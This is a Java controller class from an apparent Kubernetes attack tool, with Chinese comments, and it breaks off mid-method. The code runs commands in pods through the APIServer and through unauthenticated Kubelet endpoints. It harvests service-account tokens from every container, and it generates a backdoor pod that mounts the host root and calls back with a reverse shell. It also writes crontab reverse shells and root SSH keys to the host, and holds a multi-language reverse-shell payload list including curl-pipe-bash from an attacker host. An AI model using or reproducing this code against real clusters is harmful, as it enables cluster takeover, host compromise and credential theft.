package com.k8spen.tool.controller;

import com.k8spen.tool.view.ResultPane;
import com.k8spen.tool.view.ResourceDetails;
import com.k8spen.tool.view.TableRowActions;
import com.k8spen.tool.view.ArticleWindow;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.k8spen.tool.helper.PodJsonParser;
import com.k8spen.tool.helper.PodTableItem;
import com.k8spen.tool.utils.K8sHttpUtil;
import com.k8spen.tool.utils.KubectlUtil;
import javafx.application.Platform;
import javafx.beans.property.SimpleListProperty;
import javafx.collections.FXCollections;
import javafx.concurrent.Task;
import javafx.scene.control.*;
import javafx.stage.Stage;

import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

/**
 * 2.执行 — APIServer exec / Kubelet exec / 后门Pod / SA利用 / RBAC / 反弹Shell
 */
public class ExecHandler {

    private final ControllerContext ctx;

    // APIServer exec
    private final TextField apiExecNs, apiExecPod, apiExecContainer, apiExecCmd;
    private final TextField apiExecUsername;
    private final PasswordField apiExecPassword;
    private final ResultPane apiExecOutput;
    private final TableView<PodTableItem> apiPodTable;
    private final Label apiPodCount;
    private final TableColumn<PodTableItem,String> colNs, colName, colStatus, colNode, colIP, colContainers;

    // Kubelet exec
    private final TextField execNamespace, execPodName, execContainerName, execCommand;
    private final ResultPane execOutput;
    private final TableView<PodTableItem> kubeletPodTable;
    private final Label kubeletPodCount;
    private final TableColumn<PodTableItem,String> kColNs, kColName, kColStatus, kColNode, kColIP, kColContainers;

    // 后门Pod
    private final TextField backdoorImage, backdoorMountPath, backdoorNodeName;
    private final TextField backdoorLhost, backdoorLport, backdoorPodName;
    private final TextArea sshPubKeyInput, backdoorYamlOutput;

    // SA利用
    private Stage saArticleWindow;
    private final TextField saTokenInput;
    private final ResultPane saCheckOutput;

    // RBAC
    private final TextArea rbacCheckCmds, rbacOutput;

    // 反弹Shell
    private final TextField revShellLhost, revShellLport;
    private final ComboBox<String> revShellType;
    private final TextArea revShellOutput;

    private final String defaultSshPubKey, defaultSshPrivKey;

    public ExecHandler(ControllerContext ctx,
                       TextField apiExecNs, TextField apiExecPod, TextField apiExecContainer,
                       TextField apiExecCmd, TextField apiExecUsername, PasswordField apiExecPassword,
                       ResultPane apiExecOutput,
                       TableView<PodTableItem> apiPodTable, Label apiPodCount,
                       TableColumn<PodTableItem,String> colNs, TableColumn<PodTableItem,String> colName,
                       TableColumn<PodTableItem,String> colStatus, TableColumn<PodTableItem,String> colNode,
                       TableColumn<PodTableItem,String> colIP, TableColumn<PodTableItem,String> colContainers,
                       TextField execNamespace, TextField execPodName, TextField execContainerName,
                       TextField execCommand, ResultPane execOutput,
                       TableView<PodTableItem> kubeletPodTable, Label kubeletPodCount,
                       TableColumn<PodTableItem,String> kColNs, TableColumn<PodTableItem,String> kColName,
                       TableColumn<PodTableItem,String> kColStatus, TableColumn<PodTableItem,String> kColNode,
                       TableColumn<PodTableItem,String> kColIP, TableColumn<PodTableItem,String> kColContainers,
                       TextField backdoorImage, TextField backdoorMountPath, TextField backdoorNodeName,
                       TextField backdoorLhost, TextField backdoorLport, TextField backdoorPodName,
                       TextArea sshPubKeyInput, TextArea backdoorYamlOutput,
                       TextField saTokenInput, ResultPane saCheckOutput,
                       TextArea rbacCheckCmds, TextArea rbacOutput,
                       TextField revShellLhost, TextField revShellLport,
                       ComboBox<String> revShellType, TextArea revShellOutput,
                       String defaultSshPubKey, String defaultSshPrivKey) {
        this.ctx = ctx;
        this.apiExecNs = apiExecNs; this.apiExecPod = apiExecPod;
        this.apiExecContainer = apiExecContainer; this.apiExecCmd = apiExecCmd;
        this.apiExecUsername = apiExecUsername; this.apiExecPassword = apiExecPassword;
        this.apiExecOutput = apiExecOutput;
        this.apiPodTable = apiPodTable;
        this.apiPodCount = apiPodCount;
        this.colNs = colNs; this.colName = colName; this.colStatus = colStatus;
        this.colNode = colNode; this.colIP = colIP; this.colContainers = colContainers;
        this.execNamespace = execNamespace; this.execPodName = execPodName;
        this.execContainerName = execContainerName; this.execCommand = execCommand;
        this.execOutput = execOutput;
        this.kubeletPodTable = kubeletPodTable;
        this.kubeletPodCount = kubeletPodCount;
        this.kColNs = kColNs; this.kColName = kColName; this.kColStatus = kColStatus;
        this.kColNode = kColNode; this.kColIP = kColIP; this.kColContainers = kColContainers;
        this.backdoorImage = backdoorImage; this.backdoorMountPath = backdoorMountPath;
        this.backdoorNodeName = backdoorNodeName; this.backdoorLhost = backdoorLhost;
        this.backdoorLport = backdoorLport; this.backdoorPodName = backdoorPodName;
        this.sshPubKeyInput = sshPubKeyInput; this.backdoorYamlOutput = backdoorYamlOutput;
        this.saTokenInput = saTokenInput; this.saCheckOutput = saCheckOutput;
        this.rbacCheckCmds = rbacCheckCmds; this.rbacOutput = rbacOutput;
        this.revShellLhost = revShellLhost; this.revShellLport = revShellLport;
        this.revShellType = revShellType; this.revShellOutput = revShellOutput;
        this.defaultSshPubKey = defaultSshPubKey; this.defaultSshPrivKey = defaultSshPrivKey;
    }

    public void init() {
        initRbacCheckCmds();
        initPodClickAutoFill();
    }

    // ================ APIServer exec ================

    public void apiListPods() {
        String ns = apiExecNs.getText().trim();
        String url;
        if (ns.isEmpty() || ns.equals("--all")) {
            url = ctx.buildApiServerUrl("/api/v1/pods");
            ctx.log("[*] GET " + url + " (所有namespace)");
        } else {
            url = ctx.buildApiServerUrl("/api/v1/namespaces/" + ns + "/pods");
            ctx.log("[*] GET " + url);
        }
        if (url == null) { apiExecOutput.setText("[-] 请填写目标地址"); return; }
        ctx.setStatus("获取Pod列表中...");
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                return K8sHttpUtil.sendRequest(url, "GET", ctx.getToken(), ctx.getTimeout());
            }
        };
        task.setOnSucceeded(e -> {
            List<PodTableItem> pods = PodJsonParser.parse(task.getValue());
            apiPodTable.setItems(FXCollections.observableArrayList(pods));
            apiExecOutput.setText("[+] 列出 " + pods.size() + " 个 Pod");
            ctx.setStatus("Pod列表获取完成: " + pods.size() + "个");
            ctx.log("[+] Pod列表获取成功: " + pods.size() + " 个");
        });
        task.setOnFailed(e -> { apiExecOutput.setText("[-] 失败: " + (task.getException() != null ? task.getException().getMessage() : "")); ctx.log("[-] Pod列表获取失败"); });
        new Thread(task).start();
    }

    public void apiExecInPod() {
        String ns = apiExecNs.getText().trim();
        String pod = apiExecPod.getText().trim();
        String container = apiExecContainer.getText().trim();
        String cmd = apiExecCmd.getText().trim();
        if (pod.isEmpty() || cmd.isEmpty()) { apiExecOutput.setText("[-] 请填写Pod名称和命令"); return; }
        if (ns.isEmpty()) ns = "default";
        String kubectlCmd = "kubectl exec " + pod + " -n " + ns + (container.isEmpty() ? "" : " -c " + container) + " -- " + cmd;
        ctx.log("[*] APIServer exec (kubectl): " + ns + "/" + pod + " -> " + cmd);
        ctx.setStatus("执行命令中...");
        String fNs = ns; String host = ctx.getHost(); String token = ctx.getToken();
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                String kcPath = generateApiServerKubeconfig(host, token);
                List<String> args = new ArrayList<>();
                args.add("exec"); args.add(pod); args.add("-n"); args.add(fNs);
                if (!container.isEmpty()) { args.add("-c"); args.add(container); }
                args.add("--");
                for (String part : cmd.split("\\s+")) { if (!part.isEmpty()) args.add(part); }
                return KubectlUtil.execWithKubeconfig(kcPath, ctx.getTimeout(), args.toArray(new String[0]));
            }
        };
        task.setOnSucceeded(e -> {
            String result = task.getValue();
            apiExecOutput.showResponse(result, "# " + kubectlCmd + "\n\n" + result);
            if (result.startsWith("[Exit code:")) ctx.log("[-] exec失败: " + result.substring(0, Math.min(100, result.length())));
            else ctx.log("[+] exec执行成功");
            ctx.setStatus("命令执行完成");
        });
        task.setOnFailed(e -> { apiExecOutput.setText("[-] 执行失败: " + (task.getException() != null ? task.getException().getMessage() : "")); ctx.log("[-] exec执行失败"); });
        new Thread(task).start();
    }

    public void apiEnumSATokens() {
        ctx.log("[*] 通过APIServer HTTP枚举SA Token (Secrets API)...");
        ctx.setStatus("枚举SA Token中...");
        apiExecOutput.setText("[*] 正在通过APIServer HTTP枚举SA Token...\n");
        String secretsUrl = ctx.buildApiServerUrl("/api/v1/secrets?fieldSelector=type=kubernetes.io/service-account-token");
        if (secretsUrl == null) { apiExecOutput.setText("[-] 请填写目标地址"); return; }
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception { return K8sHttpUtil.sendRequest(secretsUrl, "GET", ctx.getToken(), ctx.getTimeout()); }
        };
        task.setOnSucceeded(e -> {
            String resp = task.getValue();
            try {
                JsonObject root = JsonParser.parseString(resp).getAsJsonObject();
                JsonArray items = root.getAsJsonArray("items");
                if (items == null || items.size() == 0) { apiExecOutput.setText("[-] 未找到SA Token Secret"); return; }
                StringBuilder sb = new StringBuilder(String.format("[*] 找到 %d 个 SA Token Secret\n\n", items.size()));
                for (int i = 0; i < items.size(); i++) {
                    JsonObject item = items.get(i).getAsJsonObject();
                    JsonObject meta = item.getAsJsonObject("metadata");
                    String name = meta.has("name") ? meta.get("name").getAsString() : "?";
                    String ns2 = meta.has("namespace") ? meta.get("namespace").getAsString() : "?";
                    String saName = "";
                    if (meta.has("annotations")) { JsonObject a = meta.getAsJsonObject("annotations"); if (a.has("kubernetes.io/service-account.name")) saName = a.get("kubernetes.io/service-account.name").getAsString(); }
                    String tokenB64 = item.has("data") && item.getAsJsonObject("data").has("token") ? item.getAsJsonObject("data").get("token").getAsString() : "";
                    String decoded = tokenB64;
                    try { decoded = new String(Base64.getDecoder().decode(tokenB64)); } catch (Exception ignored) {}
                    sb.append("=".repeat(70)).append("\n");
                    sb.append(String.format("✅ [%d] %s/%s (SA: %s)\n", i + 1, ns2, name, saName));
                    sb.append("Token: ").append(decoded.length() > 200 ? decoded.substring(0, 200) + "..." : decoded).append("\n\n");
                }
                apiExecOutput.setText(sb.toString());
                ctx.log("[+] SA Token枚举完成: 找到 " + items.size() + " 个");
            } catch (Exception ex) { ctx.showHttpResponse(apiExecOutput, resp); }
            ctx.setStatus("SA Token枚举完成");
        });
        task.setOnFailed(e -> { apiExecOutput.setText("[-] 枚举失败: " + (task.getException() != null ? task.getException().getMessage() : "")); });
        new Thread(task).start();
    }

    // ================ Kubelet exec ================

    public void listPodsForExec() {
        String host = ctx.getHost(); if (host == null) return;
        String url = "https://" + host + ":10250/pods";
        ctx.log("[*] GET " + url + " (Kubelet本节点Pod)");
        ctx.setStatus("Kubelet获取Pod列表中...");
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception { return K8sHttpUtil.sendRequest(url, "GET", ctx.getToken(), ctx.getTimeout()); }
        };
        task.setOnSucceeded(e -> {
            List<PodTableItem> pods = PodJsonParser.parse(task.getValue());
            kubeletPodTable.setItems(FXCollections.observableArrayList(pods));
            execOutput.setText("[+] Kubelet列出 " + pods.size() + " 个 Pod\n# curl -k " + url);
            ctx.setStatus("Kubelet Pod列表: " + pods.size() + "个");
        });
        task.setOnFailed(e -> { execOutput.setText("[-] 失败: " + (task.getException() != null ? task.getException().getMessage() : "")); });
        new Thread(task).start();
    }

    public void execInPod() {
        String host = ctx.getHost(); if (host == null) return;
        String ns = execNamespace.getText().trim(); String pod = execPodName.getText().trim();
        String container = execContainerName.getText().trim(); String cmd = execCommand.getText().trim();
        if (pod.isEmpty() || cmd.isEmpty()) { execOutput.setText("[-] 请填写Pod名称和命令"); return; }
        String kubeletUrl = "https://" + host + ":10250/run/" + ns + "/" + pod + "/" + container;
        ctx.log("[*] Kubelet exec: " + ns + "/" + pod + "/" + container + " -> " + cmd);
        execOutput.setText("# curl -k -X POST \"" + kubeletUrl + "\" -d \"cmd=" + cmd + "\"\n\n执行中...");
        ctx.asyncPost(kubeletUrl, "cmd=" + cmd, "application/x-www-form-urlencoded", execOutput);
    }

    public void execRevShellInPod() {
        String host = ctx.getHost(); if (host == null) return;
        String ns = execNamespace.getText().trim(); String pod = execPodName.getText().trim();
        String container = execContainerName.getText().trim();
        if (pod.isEmpty()) { execOutput.setText("[-] 请填写Pod名称"); return; }
        String hint = "# 在Pod中执行反弹Shell:\nkubectl exec -it " + pod + " -n " + ns + (container.isEmpty() ? "" : " -c " + container)
                + " -- bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\n\n# 或使用sh:\nkubectl exec -it " + pod + " -n " + ns + (container.isEmpty() ? "" : " -c " + container)
                + " -- sh -c 'sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\n\n# 使用反弹Shell页签生成payload后替换<LHOST>和<LPORT>";
        execOutput.setText(hint + "\n\n[*] 请先在'反弹Shell'页签生成payload，然后复制到命令中执行");
    }

    public void enumSATokensViaExec() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.log("[*] 通过Kubelet枚举所有Pod的SA Token...");
        ctx.setStatus("枚举SA Token中...");
        execOutput.setText("[*] 正在通过Kubelet API枚举所有Pod的SA Token...\n");
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                StringBuilder sb = new StringBuilder();
                String podsUrl = "https://" + host + ":10250/pods/";
                String podsJson = K8sHttpUtil.sendRequest(podsUrl, "GET", null, ctx.getTimeout());
                if (podsJson.contains("[HTTP 4") || podsJson.contains("[HTTP 5") || !podsJson.contains("items")) {
                    sb.append("[-] 无法通过Kubelet获取Pod列表\n").append(podsJson.substring(0, Math.min(500, podsJson.length())));
                    return sb.toString();
                }
                String json = podsJson.substring(podsJson.indexOf('\n') + 1).trim();
                JsonObject root = JsonParser.parseString(json).getAsJsonObject();
                JsonArray items = root.has("items") ? root.getAsJsonArray("items") : new JsonArray();
                int total = 0, found = 0;
                for (int i = 0; i < items.size(); i++) {
                    JsonObject pod = items.get(i).getAsJsonObject();
                    JsonObject meta = pod.getAsJsonObject("metadata");
                    String ns = meta.has("namespace") ? meta.get("namespace").getAsString() : "default";
                    String podName = meta.has("name") ? meta.get("name").getAsString() : "";
                    JsonObject spec = pod.has("spec") ? pod.getAsJsonObject("spec") : new JsonObject();
                    JsonArray containers = spec.has("containers") ? spec.getAsJsonArray("containers") : new JsonArray();
                    for (int c = 0; c < containers.size(); c++) {
                        String containerName = containers.get(c).getAsJsonObject().get("name").getAsString();
                        total++;
                        updateMessage("检查: " + ns + "/" + podName + "/" + containerName + " (" + total + "/" + items.size() + ")");
                        try {
                            String execUrl = "https://" + host + ":10250/run/" + ns + "/" + podName + "/" + containerName;
                            String result = K8sHttpUtil.sendPost(execUrl, "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token", "application/x-www-form-urlencoded", null, 5);
                            if (result != null && !result.contains("[HTTP 4") && !result.contains("[HTTP 5")) {
                                String tokenVal = result.contains("\n") ? result.substring(result.indexOf('\n') + 1).trim() : result.trim();
                                if (!tokenVal.isEmpty() && !tokenVal.contains("No such file") && !tokenVal.contains("not found") && tokenVal.length() > 20) {
                                    found++;
                                    sb.append("=".repeat(70)).append("\n");
                                    sb.append(String.format("✅ [%d] %s/%s (container: %s)\n", found, ns, podName, containerName));
                                    sb.append("Token: ").append(tokenVal).append("\n\n");
                                }
                            }
                        } catch (Exception ignored) {}
                    }
                }
                sb.insert(0, String.format("[*] 扫描完成: 检查了 %d 个容器, 找到 %d 个 SA Token\n\n", total, found));
                if (found == 0) { sb.append("[-] 未找到可读取的SA Token\n提示:\n  1. Pod可能未挂载SA Token\n  2. 容器中没有cat命令\n  3. Kubelet API可能需要认证\n"); }
                return sb.toString();
            }
        };
        task.messageProperty().addListener((obs, o, n) -> Platform.runLater(() -> ctx.setStatus(n)));
        task.setOnSucceeded(e -> { execOutput.setText(task.getValue()); ctx.setStatus("SA Token枚举完成"); ctx.log("[+] SA Token枚举完成"); });
        task.setOnFailed(e -> { execOutput.setText("[-] 枚举失败: " + (task.getException() != null ? task.getException().getMessage() : "")); });
        new Thread(task).start();
    }

    // ================ 后门Pod ================

    public void generateBackdoorYaml() {
        String image = backdoorImage.getText().trim(); String mountPath = backdoorMountPath.getText().trim();
        String nodeName = backdoorNodeName.getText().trim(); String lhost = backdoorLhost.getText().trim();
        String lport = backdoorLport.getText().trim(); String podName = backdoorPodName.getText().trim();
        if (image.isEmpty()) image = "ubuntu:latest"; if (mountPath.isEmpty()) mountPath = "/mnt"; if (podName.isEmpty()) podName = "backdoor-pod";
        StringBuilder yaml = new StringBuilder();
        yaml.append("apiVersion: v1\nkind: Pod\nmetadata:\n  name: ").append(podName).append("\n  labels:\n    app: ").append(podName).append("\nspec:\n");
        if (!nodeName.isEmpty()) yaml.append("  nodeName: ").append(nodeName).append("\n");
        yaml.append("  restartPolicy: Always\n  containers:\n  - name: ").append(podName).append("\n    image: ").append(image).append("\n    imagePullPolicy: IfNotPresent\n");
        if (!lhost.isEmpty() && !lport.isEmpty()) yaml.append("    command: [\"/bin/bash\"]\n    args: [\"-c\", \"bash -i >& /dev/tcp/").append(lhost).append("/").append(lport).append(" 0>&1\"]\n");
        else yaml.append("    command: [\"sleep\"]\n    args: [\"infinity\"]\n");
        yaml.append("    volumeMounts:\n    - name: host-root\n      mountPath: ").append(mountPath).append("\n  volumes:\n  - name: host-root\n    hostPath:\n      path: /\n      type: Directory\n");
        backdoorYamlOutput.setText(yaml.toString());
        ctx.log("[+] 后门Pod YAML生成完成");
    }

    public void copyBackdoorYaml() {
        String yaml = backdoorYamlOutput.getText();
        if (yaml == null || yaml.isEmpty()) { generateBackdoorYaml(); yaml = backdoorYamlOutput.getText(); }
        ctx.copyToClipboard(yaml);
    }

    public void generateBackdoorCmd() {
        String podName = backdoorPodName.getText().trim(); if (podName.isEmpty()) podName = "backdoor-pod";
        String lhost = backdoorLhost.getText().trim(); String lport = backdoorLport.getText().trim();
        String mountPath = backdoorMountPath.getText().trim();
        StringBuilder sb = new StringBuilder("# ======== 后门Pod操作命令 ========\n\n# 1. 将YAML保存为文件并创建\nkubectl apply -f backdoor.yaml\n\n# 2. 查看Pod状态\nkubectl get pod ").append(podName).append("\n\n# 3. 进入Pod shell\nkubectl exec -it ").append(podName).append(" -- /bin/bash\n\n# 4. 通过挂载目录访问宿主机文件系统\n# ls ").append(mountPath).append("/\n\n# 5. 通过写crontab获取Node的shell\n");
        if (!lhost.isEmpty() && !lport.isEmpty()) sb.append("echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/").append(lhost).append("/").append(lport).append(" 0>&1\"' > ").append(mountPath).append("/etc/crontab\n\n");
        sb.append("# 6. 删除后门Pod\nkubectl delete pod ").append(podName).append("\n");
        backdoorYamlOutput.setText(sb.toString());
        ctx.log("[+] kubectl命令生成完成");
    }

    public void generateSshCmd() {
        String mountPath = backdoorMountPath.getText().trim(); String pubKey = sshPubKeyInput.getText().trim();
        String host = ctx.getHost(); if (mountPath.isEmpty()) mountPath = "/mnt";
        String podName = backdoorPodName.getText().trim();
        StringBuilder sb = new StringBuilder("# ======== SSH私钥登录宿主机流程 ========\n\n# === 第一步: 保存私钥到攻击机 ===\ncat > ~/.ssh/k8s_backdoor << 'EOF'\n").append(defaultSshPrivKey).append("\nEOF\nchmod 600 ~/.ssh/k8s_backdoor\n\n");
        sb.append("# === 第二步: 在后门Pod中追加公钥到宿主机 ===\nkubectl exec -it ").append(podName).append(" -- /bin/bash\n\nmkdir -p ").append(mountPath).append("/root/.ssh\nchmod 700 ").append(mountPath).append("/root/.ssh\n\n");
        sb.append("echo '").append(pubKey.isEmpty() ? "<YOUR_SSH_PUBLIC_KEY>" : pubKey).append("' >> ").append(mountPath).append("/root/.ssh/authorized_keys\nchmod 600 ").append(mountPath).append("/root/.ssh/authorized_keys\n\n");
        sb.append("grep -i 'PermitRootLogin\\|PubkeyAuthentication' ").append(mountPath).append("/etc/ssh/sshd_config\n\nsed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' ").append(mountPath).append("/etc/ssh/sshd_config\nsed -i 's/#PubkeyAuthentication.*/PubkeyAuthentication yes/' ").append(mountPath).append("/etc/ssh/sshd_config\n\n");
        sb.append("echo '* * * * * root systemctl restart sshd' >> ").append(mountPath).append("/etc/crontab\n\n# === 第三步: SSH登录宿主机(在攻击机上执行) ===\n");
        sb.append("ssh -i ~/.ssh/k8s_backdoor root@").append(host != null && !host.isEmpty() ? host : "<TARGET_HOST>").append("\n\n");
        sb.append("# === 备选: 写入非根用户 ===\ncat ").append(mountPath).append("/etc/passwd | grep -v nologin | grep -v false\n");
        backdoorYamlOutput.setText(sb.toString());
        ctx.log("[+] SSH登录命令生成完成");
    }

    // ================ SA利用 ================

    public void copySaUtilCmds2() { ctx.copyToClipboard(SA_UTIL_ARTICLE); }

    public void showSaUtilArticle() {
        if (saArticleWindow == null) {
            saArticleWindow = ArticleWindow.create(saTokenInput,
                    "利用 ServiceAccount Token 控制 APIServer", SA_UTIL_ARTICLE, this::copySaUtilCmds2);
        }
        saArticleWindow.show();
        saArticleWindow.toFront();
    }

    public void checkSaPermissions() {
        String host = ctx.getHost(); if (host == null) return;
        String token = saTokenInput.getText().trim();
        if (token.isEmpty()) token = ctx.getToken();
        if (token.isEmpty()) { saCheckOutput.setText("[-] 请输入SA Token或在目标配置中填写Token"); return; }
        String url = ctx.getApiBaseUrl() + "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews";
        String body = "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"default\"}}";
        ctx.setStatus("正在检查SA权限..."); saCheckOutput.setText("请求中...\n");
        String fToken = token;
        Task<String> task = new Task<>() { @Override protected String call() throws Exception { return K8sHttpUtil.sendPost(url, body, "application/json", fToken, ctx.getTimeout()); } };
        task.setOnSucceeded(e -> { saCheckOutput.setText(task.getValue()); ctx.setStatus("权限检查完成"); ctx.log("[+] SA权限检查完成"); });
        task.setOnFailed(e -> { saCheckOutput.setText("[-] 请求失败: " + task.getException().getMessage()); });
        new Thread(task).start();
    }

    // ================ RBAC ================

    public void copyRbacCmds() { ctx.copyToClipboard(rbacCheckCmds.getText()); }

    public void checkRbacStatus() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.setStatus("检测RBAC..."); rbacOutput.setText("检测中...\n");
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                StringBuilder sb = new StringBuilder("# RBAC检测结果:\n\n");
                try {
                    String result = K8sHttpUtil.sendRequest(ctx.getApiBaseUrl() + "/apis/rbac.authorization.k8s.io/v1", "GET", ctx.getToken(), ctx.getTimeout());
                    if (result.contains("200")) sb.append("[+] RBAC API可访问 - RBAC可能已开启\n\n");
                    else sb.append("[-] RBAC API返回非200 - 可能未开启RBAC\n\n");
                    sb.append(result);
                } catch (Exception e) { sb.append("[-] 无法连接APIServer: ").append(e.getMessage()).append("\n\n# 请在master节点手动检查:\nps -ef | grep apiserver | grep authorization-mode\n"); }
                return sb.toString();
            }
        };
        task.setOnSucceeded(e -> { rbacOutput.setText(task.getValue()); ctx.setStatus("RBAC检测完成"); });
        task.setOnFailed(e -> rbacOutput.setText("[-] 检测失败: " + task.getException().getMessage()));
        new Thread(task).start();
    }

    // ================ 反弹Shell ================

    public void generateRevShell() {
        String lhost = revShellLhost.getText().trim(); String lport = revShellLport.getText().trim();
        if (lhost.isEmpty() || lport.isEmpty()) { revShellOutput.setText("[-] 请填写LHOST和LPORT"); return; }
        String type = revShellType.getValue();
        String payload;
        switch (type) {
            case "Bash -i": payload = "bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1"; break;
            case "Bash TCP": payload = "bash -c 'sh -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1'"; break;
            case "Python": payload = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + lhost + "\"," + lport + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"; break;
            case "Perl": payload = "perl -e 'use Socket;$i=\"" + lhost + "\";$p=" + lport + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"; break;
            case "NC -e": payload = "nc -e /bin/sh " + lhost + " " + lport; break;
            case "NC mkfifo": payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + lhost + " " + lport + " >/tmp/f"; break;
            case "PHP": payload = "php -r '$sock=fsockopen(\"" + lhost + "\"," + lport + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"; break;
            case "Ruby": payload = "ruby -rsocket -e'f=TCPSocket.open(\"" + lhost + "\"," + lport + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"; break;
            case "Lua": payload = "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('" + lhost + "','" + lport + "');os.execute('/bin/sh -i <&3 >&3 2>&3');\""; break;
            case "Curl": payload = "# 先在VPS上创建文件 shell.sh:\n# bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1\n\n# 目标执行:\ncurl http://" + lhost + "/shell.sh | bash"; break;
            default: payload = ""; break;
        }
        revShellOutput.setText("# 反弹Shell Payload (" + type + ")\n# LHOST: " + lhost + "  LPORT: " + lport + "\n\n" + payload + "\n\n# ========== 监听命令 ==========\nnc -lvnp " + lport + "\n");
        ctx.log("[+] 反弹Shell payload生成完成 (" + type + ")");
    }

    public void copyRevShell() { String t = revShellOutput.getText(); if (t != null && !t.isEmpty()) ctx.copyToClipboard(t); }

    // ================ Kubeconfig生成 ================

    public String generatePersistKubeconfig(String host, String token, String username, String password) throws Exception {
        boolean hasToken = token != null && !token.isEmpty();
        boolean hasUser = username != null && !username.isEmpty();
        boolean hasAuth = hasToken || hasUser;
        String server = ctx.getApiBaseUrl();
        if (server == null) server = "https://" + host + ":6443";
        StringBuilder kc = new StringBuilder("apiVersion: v1\nkind: Config\nclusters:\n- cluster:\n    server: ").append(server).append("\n    insecure-skip-tls-verify: true\n  name: target\ncontexts:\n- context:\n    cluster: target\n");
        if (hasAuth) kc.append("    user: target-user\n");
        kc.append("  name: target\ncurrent-context: target\n");
        if (hasAuth) { kc.append("users:\n- name: target-user\n  user:\n"); if (hasToken) kc.append("    token: ").append(token).append("\n"); else kc.append("    username: ").append(username).append("\n    password: ").append(password != null ? password : "").append("\n"); }
        else kc.append("users: []\n");
        return KubectlUtil.saveKubeconfig(kc.toString());
    }

    private String generateApiServerKubeconfig(String host, String token) throws Exception {
        String username = apiExecUsername != null ? apiExecUsername.getText().trim() : "";
        String password = apiExecPassword != null ? apiExecPassword.getText().trim() : "";
        return generatePersistKubeconfig(host, token, username, password);
    }

    // ================ Init ================

    private static final String SA_UTIL_ARTICLE =
            "# ======== ServiceAccount Token利用流程 ========\n\n"
            + "# 1. 在Pod内读取Token\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n\n"
            + "# 2. 获取APIServer地址\nAPISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\n\n"
            + "# 3. 检查当前Token权限\ncurl -k -H \"Authorization: Bearer $TOKEN\" \\\n  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \\\n  -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"default\"}}'\n\n"
            + "# 4. 如果有高权限,使用kubectl控制集群\nkubectl --server=$APISERVER --token=$TOKEN \\\n  --insecure-skip-tls-verify=true get nodes\n\n"
            + "# 5. 创建后门Pod(参考'创建后门Pod'页签)\nkubectl --server=$APISERVER --token=$TOKEN \\\n  --insecure-skip-tls-verify=true apply -f backdoor.yaml\n";

    private void initRbacCheckCmds() {
        rbacCheckCmds.setText(
                "# ======== RBAC权限检测 ========\n\n"
                + "# 1. 检查APIServer是否开启RBAC\nps -ef | grep apiserver | grep authorization-mode\n\n"
                + "# 2. 查看APIServer Pod配置\ncat /etc/kubernetes/manifests/kube-apiserver.yaml | grep authorization\n\n"
                + "# 如果包含 --authorization-mode=RBAC 则已开启\n# 如果未开启RBAC,任意认证token均可控制APIServer\n\n"
                + "# 3. 查看当前用户权限\nkubectl auth can-i --list\n\n"
                + "# 4. 查看所有ClusterRoleBinding\nkubectl get clusterrolebindings -o wide\n\n"
                + "# 5. 查找绑定了cluster-admin的服务账号\nkubectl get clusterrolebindings -o json | grep -B 10 'cluster-admin'\n\n"
                + "# 6. 利用未开启RBAC的集群\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nkubectl --server=https://<APISERVER>:6443 --token=$TOKEN \\\n  --insecure-skip-tls-verify=true get pods --all-namespaces\n"
        );
    }

    private void initPodClickAutoFill() {
        installPodActions(apiPodTable, apiPodCount);
        installPodActions(kubeletPodTable, kubeletPodCount);
        colNs.setCellValueFactory(c -> c.getValue().namespaceProperty());
        colName.setCellValueFactory(c -> c.getValue().nameProperty());
        colStatus.setCellValueFactory(c -> c.getValue().statusProperty());
        colNode.setCellValueFactory(c -> c.getValue().nodeProperty());
        colIP.setCellValueFactory(c -> c.getValue().podIPProperty());
        colContainers.setCellValueFactory(c -> c.getValue().containersProperty());
        apiPodTable.getSelectionModel().selectedItemProperty().addListener((obs, oldVal, newVal) -> {
            if (newVal != null) {
                apiExecNs.setText(newVal.getNamespace()); apiExecPod.setText(newVal.getName());
                apiExecContainer.setText(newVal.getFirstContainer());
                ctx.log("[*] 已填充: " + newVal.getNamespace() + "/" + newVal.getName() + " (容器: " + newVal.getFirstContainer() + ")");
            }
        });
        kColNs.setCellValueFactory(c -> c.getValue().namespaceProperty());
